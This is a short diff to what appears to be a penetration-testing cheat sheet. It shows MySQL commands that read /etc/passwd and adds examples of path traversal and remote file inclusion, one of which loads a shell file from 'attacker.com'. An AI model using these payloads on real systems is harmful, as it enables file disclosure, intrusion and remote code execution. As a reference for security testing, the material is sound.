@@ -93,5 +93,13 @@ SELECT LOAD_FILE('<text file path>'); //read files by using the load_file functi
 CREATE TABLE temptable(output longtext);
 LOAD DATA INFILE '/etc/passwd' INTO TABLE temptable FIELDS
 TERMINATED BY '\n' (output);
+```
+_1.3 Other Web Attack_
+```
+File Inclusion/Path Traversal
+//Can try path traversal after having successfully uploaded a file to webapp, by attempting to browse to root folder, in Linux:
+Example: fileshare.com/files.php?file=../../../../../../etc/passwd
+Remote File Inclusion
+Example: fileshare.com/files.php?file=http://attacker.com/shells/shell.txt
 
 ```
